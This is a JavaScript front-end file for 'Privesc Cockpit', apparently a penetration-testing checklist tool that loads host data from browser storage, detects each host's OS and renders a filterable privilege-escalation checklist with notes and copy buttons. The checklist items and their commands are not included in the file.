document.addEventListener('DOMContentLoaded', () => {
    console.log("Privesc Cockpit v3 (Refactored) Initializing...");

    // --- Références DOM ---
    const nodeSelect = document.getElementById('node-select');
    const activeNodeInfoEl = document.getElementById('active-node-info');
    const checklistContainer = document.getElementById('checklist-container');
    const checklistPlaceholder = document.getElementById('checklist-placeholder');
    const checklistSearchInput = document.getElementById('checklist-search');
    const checklistFilterStatus = document.getElementById('checklist-filter-status');
    const checklistFilterTag = document.getElementById('checklist-filter-tag');
    const applyFiltersBtn = document.getElementById('apply-checklist-filters'); // Vérifiez cet ID dans privesc.html
    const checklistItemTemplate = document.getElementById('checklist-item-template');

    // --- État Global ---
    let hostManagerData = null;
    let currentNodeId = null;
    let checklistState = {};
    let availableTags = new Set();
    const HOST_MANAGER_STORAGE_KEY = 'pentestHostData_v2';
    const CHECKLIST_STORAGE_KEY = 'privescChecklistState_v3_refactored';

    // --- Initialisation ---
    function initialize() {
        console.log("Initializing Privesc Cockpit v3...");
        loadHostManagerData();
        loadChecklistStateFromStorage();
        setupEventListeners();
        populateTagFilter();
        displayInitialView();
    }

    // --- Chargement des Données ---
    function loadHostManagerData() {
        console.log(`Attempting to load data from HostManager (localStorage key: ${HOST_MANAGER_STORAGE_KEY})...`);
        try {
            const storedData = localStorage.getItem(HOST_MANAGER_STORAGE_KEY);
            if (storedData) {
                hostManagerData = JSON.parse(storedData);
                console.log("HostManager data loaded successfully:", hostManagerData);
                populateNodeSelector();
            } else {
                console.warn(`No HostManager data found in localStorage ('${HOST_MANAGER_STORAGE_KEY}').`);
                hostManagerData = { categories: {}, edges: [] };
                nodeSelect.innerHTML = '<option value="">Aucune donnée HostManager trouvée</option>';
                nodeSelect.disabled = true;
            }
        } catch (error) {
            console.error("Error loading or parsing HostManager data:", error);
            hostManagerData = { categories: {}, edges: [] };
            nodeSelect.innerHTML = '<option value="">Erreur chargement données</option>';
            nodeSelect.disabled = true;
            checklistPlaceholder.textContent = "Erreur lors du chargement des données depuis HostManager.";
            checklistPlaceholder.style.display = 'block';
        }
    }

    function loadChecklistStateFromStorage() {
        console.log("Loading checklist state from localStorage...");
        const storedState = localStorage.getItem(CHECKLIST_STORAGE_KEY);
        if (storedState) {
            try {
                checklistState = JSON.parse(storedState);
                console.log("Checklist state loaded:", checklistState);
            } catch (error) {
                console.error("Error parsing checklist state from localStorage:", error);
                checklistState = {};
            }
        } else {
            console.log("No previous checklist state found.");
            checklistState = {};
        }
    }

    // --- Mise à jour de l'UI ---
    function populateNodeSelector() {
        nodeSelect.innerHTML = '<option value="">-- Sélectionnez un Node --</option>';
        nodeSelect.disabled = false;

        if (!hostManagerData || !hostManagerData.categories) {
            console.warn("populateNodeSelector: hostManagerData or categories missing.");
            nodeSelect.disabled = true;
            return;
        }

        let nodeCount = 0;
        const sortedCategories = Object.keys(hostManagerData.categories).sort();

        sortedCategories.forEach(categoryName => {
            const category = hostManagerData.categories[categoryName];
            if (category && category.hosts) {
                const sortedHostIds = Object.keys(category.hosts).sort();
                sortedHostIds.forEach(hostId => {
                    const host = category.hosts[hostId];
                    const option = document.createElement('option');
                    option.value = hostId;
                    let labelText = hostId;
                    if (host.system) labelText += ` (${host.system})`;
                    if (host.role) labelText += ` - ${host.role}`;
                    option.textContent = labelText;
                    nodeSelect.appendChild(option);
                    nodeCount++;
                });
            }
        });

        if (nodeCount === 0) {
             nodeSelect.innerHTML = '<option value="">Aucun node défini dans HostManager</option>';
             nodeSelect.disabled = true;
        }
    }

    function displayInitialView() {
        checklistContainer.innerHTML = '';
        checklistPlaceholder.textContent = 'Sélectionnez un node pour afficher la checklist contextuelle.';
        checklistPlaceholder.style.display = 'block';
        activeNodeInfoEl.textContent = 'Aucun node sélectionné.';
        checklistSearchInput.disabled = true;
        checklistFilterStatus.disabled = true;
        checklistFilterTag.disabled = true;
        if(applyFiltersBtn) applyFiltersBtn.disabled = true;
    }

    function displayNodeInfo(hostId) {
        const hostInfo = findHostInHostManagerData(hostId);
        if (hostInfo && hostInfo.host) {
            const host = hostInfo.host;
            let infoText = `Node: ${hostId}`;
            if (host.system) infoText += ` | OS: ${host.system}`;
            if (host.role) infoText += ` | Rôle: ${host.role}`;
            if (host.tags && host.tags.length > 0) infoText += ` | Tags: ${host.tags.join(', ')}`;
            activeNodeInfoEl.textContent = infoText;
            checklistSearchInput.disabled = false;
            checklistFilterStatus.disabled = false;
            checklistFilterTag.disabled = false;
             if(applyFiltersBtn) applyFiltersBtn.disabled = false;
        } else {
            activeNodeInfoEl.textContent = `Node: ${hostId} (Détails non trouvés)`;
            checklistSearchInput.disabled = true;
            checklistFilterStatus.disabled = true;
            checklistFilterTag.disabled = true;
            if(applyFiltersBtn) applyFiltersBtn.disabled = true;
        }
    }

    function renderChecklistForNode(hostId) {
        currentNodeId = hostId;
        console.log(`Rendering checklist for node: ${hostId}`);
        displayNodeInfo(hostId);
        checklistContainer.innerHTML = '';
        availableTags.clear();

        const osType = detectOS(hostId);
        console.log(`Detected OS for ${hostId}: ${osType}`);

        if (!osType || !CHECKLIST_DEFINITION[osType]) {
            checklistPlaceholder.textContent = `Aucune checklist définie pour l'OS '${osType || 'Inconnu'}' ou node non trouvé.`;
            checklistPlaceholder.style.display = 'block';
            return;
        }

        checklistPlaceholder.style.display = 'none';
        const categories = CHECKLIST_DEFINITION[osType];
        const nodeChecklistState = checklistState[hostId] || {};

        Object.keys(categories).sort().forEach(categoryName => {
            const categoryHeader = document.createElement('h5');
            categoryHeader.className = 'mt-4 mb-3 checklist-category-header';
            categoryHeader.textContent = categoryName;
            categoryHeader.dataset.categoryName = categoryName;
            checklistContainer.appendChild(categoryHeader);

            categories[categoryName].forEach(item => {
                if (item.tags && Array.isArray(item.tags)) {
                    item.tags.forEach(tag => availableTags.add(tag));
                }
                const itemElement = createChecklistItemElement(item, nodeChecklistState[item.id] || {});
                checklistContainer.appendChild(itemElement);
            });
        });

        populateTagFilter();
        applyFilters();
    }

    function createChecklistItemElement(itemData, itemState) {
        const templateClone = checklistItemTemplate.content.cloneNode(true);
        const itemElement = templateClone.querySelector('.checklist-item');

        itemElement.dataset.itemId = itemData.id;
        itemElement.dataset.tags = itemData.tags ? itemData.tags.join(',') : '';

        itemElement.querySelector('.checklist-label').textContent = itemData.label;
        itemElement.querySelector('.checklist-description').textContent = itemData.description;

        const statusSelect = itemElement.querySelector('.checklist-status-select');
        statusSelect.value = itemState.status || 'todo';
        itemElement.classList.add(`status-${statusSelect.value}`);

        const checkCommandContainer = itemElement.querySelector('.check-command');
        const checkCommandCode = checkCommandContainer.querySelector('code');
        const checkCommandCopyBtn = checkCommandContainer.querySelector('.copy-btn-inline');
        if (itemData.checkCommand) {
            checkCommandCode.textContent = itemData.checkCommand;
            checkCommandCopyBtn.dataset.clipboardText = itemData.checkCommand;
        } else {
            checkCommandContainer.style.display = 'none';
        }

        const exploitCommandContainer = itemElement.querySelector('.exploit-command');
        const exploitCommandCode = exploitCommandContainer.querySelector('code');
        const exploitCommandCopyBtn = exploitCommandContainer.querySelector('.copy-btn-inline');
        if (itemData.exploitCommand) {
            exploitCommandContainer.style.display = '';
            exploitCommandCode.textContent = itemData.exploitCommand;
            exploitCommandCopyBtn.dataset.clipboardText = itemData.exploitCommand;
        } else {
            exploitCommandContainer.style.display = 'none';
        }

        const linksContainer = itemElement.querySelector('.checklist-links');
        if (itemData.links && itemData.links.length > 0) {
            linksContainer.style.display = '';
            const linksList = document.createElement('div');
            itemData.links.forEach(link => {
                const a = document.createElement('a');
                a.href = link.url;
                a.textContent = link.name || 'Lien';
                a.target = '_blank';
                a.rel = 'noopener noreferrer';
                a.className = 'btn btn-outline-info btn-sm me-2 mb-1';
                linksList.appendChild(a);
            });
            linksContainer.appendChild(linksList);
        } else {
            linksContainer.style.display = 'none';
        }

        const tipsContainer = itemElement.querySelector('.checklist-tips');
        if (itemData.tips) {
            tipsContainer.style.display = '';
            tipsContainer.querySelector('p').textContent = itemData.tips;
        } else {
            tipsContainer.style.display = 'none';
        }

        const notesTextarea = itemElement.querySelector('.checklist-notes-textarea');
        notesTextarea.value = itemState.notes || '';

        return itemElement;
    }

    function findHostInHostManagerData(hostId) {
        if (!hostManagerData || !hostManagerData.categories) return null;
        for (const categoryName in hostManagerData.categories) {
            const category = hostManagerData.categories[categoryName];
            if (category.hosts && category.hosts[hostId]) {
                return { host: category.hosts[hostId], category: categoryName };
            }
        }
        return null;
    }

    function detectOS(hostId) {
        const hostInfo = findHostInHostManagerData(hostId);
        if (!hostInfo || !hostInfo.host) return 'Unknown';

        const host = hostInfo.host;

        if (host.tags && Array.isArray(host.tags)) {
            const osTag = host.tags.find(tag => tag.toLowerCase().startsWith('os:'));
            if (osTag) {
                const detected = osTag.split(':')[1]?.trim().toLowerCase();
                if (detected.includes('windows')) return 'Windows';
                if (detected.includes('linux')) return 'Linux';
            }
        }

        if (host.system) {
            const systemLower = host.system.toLowerCase();
            if (systemLower.includes('windows')) return 'Windows';
            if (systemLower.includes('linux') || systemLower.includes('debian') || systemLower.includes('ubuntu') || systemLower.includes('centos') || systemLower.includes('fedora') || systemLower.includes('arch')) return 'Linux';
        }

        if (host.tags && Array.isArray(host.tags)) {
            if (host.tags.some(tag => tag.toLowerCase() === 'ad' || tag.toLowerCase() === 'domain controller' || tag.toLowerCase() === 'dc')) {
                return 'Active Directory';
            }
        }
        if (host.role && host.role.toLowerCase().includes('domain controller')) {
             return 'Active Directory';
        }

        const categoryNameLower = hostInfo.category.toLowerCase();
        if (categoryNameLower.includes('windows')) return 'Windows';
        if (categoryNameLower.includes('linux')) return 'Linux';
        if (categoryNameLower.includes('ad') || categoryNameLower.includes('active directory')) return 'Active Directory';

        console.warn(`Could not reliably detect OS for ${hostId}. Defaulting to 'Unknown'.`);
        return 'Unknown';
    }

    function updateChecklistItemState(itemId, newStatus, newNotes) {
        if (!currentNodeId) return;

        if (!checklistState[currentNodeId]) {
            checklistState[currentNodeId] = {};
        }
        if (!checklistState[currentNodeId][itemId]) {
            checklistState[currentNodeId][itemId] = {};
        }

        checklistState[currentNodeId][itemId].status = newStatus;
        checklistState[currentNodeId][itemId].notes = newNotes;

        console.log(`State updated for Node ${currentNodeId}, Item ${itemId}:`, checklistState[currentNodeId][itemId]);
        saveChecklistStateToStorage();
    }

    function populateTagFilter() {
        const previousValue = checklistFilterTag.value;
        checklistFilterTag.innerHTML = '<option value="">Tous les tags</option>';
        const sortedTags = Array.from(availableTags).sort((a, b) => a.localeCompare(b));
        sortedTags.forEach(tag => {
            const option = document.createElement('option');
            option.value = tag;
            option.textContent = tag.charAt(0).toUpperCase() + tag.slice(1);
            checklistFilterTag.appendChild(option);
        });
        if (Array.from(checklistFilterTag.options).some(opt => opt.value === previousValue)) {
           checklistFilterTag.value = previousValue;
        }
    }

    function applyFilters() {
        if (!currentNodeId) return;

        const searchTerm = checklistSearchInput.value.toLowerCase().trim();
        const selectedStatus = checklistFilterStatus.value;
        const selectedTag = checklistFilterTag.value;

        let visibleItems = 0;
        let visibleCategories = new Set();

        checklistContainer.querySelectorAll('.checklist-item').forEach(itemElement => {
            const label = itemElement.querySelector('.checklist-label')?.textContent.toLowerCase() || '';
            const description = itemElement.querySelector('.checklist-description')?.textContent.toLowerCase() || '';
            const notes = itemElement.querySelector('.checklist-notes-textarea')?.value.toLowerCase() || '';
            const checkCommand = itemElement.querySelector('.check-command pre code')?.textContent.toLowerCase() || '';
            const exploitCommand = itemElement.querySelector('.exploit-command pre code')?.textContent.toLowerCase() || '';
            const itemTags = (itemElement.dataset.tags || '').split(',');
            const itemStatus = itemElement.querySelector('.checklist-status-select')?.value || 'todo';

            const matchesSearch = !searchTerm || label.includes(searchTerm) || description.includes(searchTerm) || notes.includes(searchTerm) || checkCommand.includes(searchTerm) || exploitCommand.includes(searchTerm);
            const matchesStatus = !selectedStatus || itemStatus === selectedStatus;
            const matchesTag = !selectedTag || itemTags.includes(selectedTag);

            if (matchesSearch && matchesStatus && matchesTag) {
                itemElement.style.display = '';
                visibleItems++;
                let currentElement = itemElement;
                while (currentElement && currentElement.previousElementSibling) {
                    currentElement = currentElement.previousElementSibling;
                    if (currentElement.matches('.checklist-category-header')) {
                        visibleCategories.add(currentElement.dataset.categoryName);
                        break;
                    }
                }
            } else {
                itemElement.style.display = 'none';
            }
        });

        checklistContainer.querySelectorAll('.checklist-category-header').forEach(header => {
            if (visibleCategories.has(header.dataset.categoryName)) {
                header.style.display = '';
            } else {
                header.style.display = 'none';
            }
        });

        if (visibleItems === 0 && checklistContainer.children.length > 1) {
            const hasItems = Array.from(checklistContainer.children).some(el => el.matches('.checklist-item'));
            if (hasItems) {
                 checklistPlaceholder.textContent = 'Aucun item ne correspond aux filtres sélectionnés.';
                 checklistPlaceholder.style.display = 'block';
            }
        } else if (checklistContainer.children.length > 1) {
             checklistPlaceholder.style.display = 'none';
        } else {
             if (!currentNodeId) {
                 checklistPlaceholder.textContent = 'Sélectionnez un node pour afficher la checklist contextuelle.';
                 checklistPlaceholder.style.display = 'block';
             } else {
                  const osType = detectOS(currentNodeId);
                  if (!CHECKLIST_DEFINITION[osType]) {
                       checklistPlaceholder.textContent = `Aucune checklist définie pour l'OS '${osType || 'Inconnu'}'.`;
                       checklistPlaceholder.style.display = 'block';
                  } else {
                       checklistPlaceholder.style.display = 'none';
                  }
             }
        }
    }

    function copyToClipboard(text, buttonElement) {
        if (!text) return;
        navigator.clipboard.writeText(text).then(() => {
            const originalContent = buttonElement.innerHTML;
            buttonElement.innerHTML = '<i class="fas fa-check text-success"></i>';
            buttonElement.disabled = true;
            setTimeout(() => {
                buttonElement.innerHTML = originalContent;
                buttonElement.disabled = false;
            }, 1500);
        }).catch(err => {
            console.error('Erreur lors de la copie :', err);
            const originalContent = buttonElement.innerHTML;
            buttonElement.innerHTML = '<i class="fas fa-times text-danger"></i>';
             setTimeout(() => {
                buttonElement.innerHTML = originalContent;
            }, 1500);
        });
    }

    function setupEventListeners() {
        nodeSelect.addEventListener('change', (e) => {
            const selectedNodeId = e.target.value;
            if (selectedNodeId) {
                renderChecklistForNode(selectedNodeId);
            } else {
                currentNodeId = null;
                displayInitialView();
            }
        });

        if (applyFiltersBtn) {
            applyFiltersBtn.addEventListener('click', applyFilters);
        } else {
             console.warn("Bouton 'apply-checklist-filters' non trouvé. Activation du filtrage direct.");
             checklistSearchInput.addEventListener('input', applyFilters);
             checklistFilterStatus.addEventListener('change', applyFilters);
             checklistFilterTag.addEventListener('change', applyFilters);
        }

        checklistContainer.addEventListener('click', (event) => {
            if (event.target.closest('.copy-btn-inline')) {
                const button = event.target.closest('.copy-btn-inline');
                const textToCopy = button.dataset.clipboardText;
                if (textToCopy) {
                    copyToClipboard(textToCopy, button);
                }
            }
        });

        checklistContainer.addEventListener('change', (event) => {
            if (event.target.matches('.checklist-status-select')) {
                const selectElement = event.target;
                const itemElement = selectElement.closest('.checklist-item');
                const itemId = itemElement.dataset.itemId;
                const newStatus = selectElement.value;
                const notesTextarea = itemElement.querySelector('.checklist-notes-textarea');
                const currentNotes = notesTextarea ? notesTextarea.value : '';

                itemElement.className = itemElement.className.replace(/status-\w+/g, '');
                itemElement.classList.add(`status-${newStatus}`);

                updateChecklistItemState(itemId, newStatus, currentNotes);
            }
        });

        checklistContainer.addEventListener('input', (event) => {
             if (event.target.matches('.checklist-notes-textarea')) {
                 const notesTextarea = event.target;
                 const itemElement = notesTextarea.closest('.checklist-item');
                 const itemId = itemElement.dataset.itemId;
                 const newNotes = notesTextarea.value;
                 const statusSelect = itemElement.querySelector('.checklist-status-select');
                 const currentStatus = statusSelect ? statusSelect.value : 'todo';

                 updateChecklistItemState(itemId, currentStatus, newNotes);
             }
        });
    }

    initialize();
}); 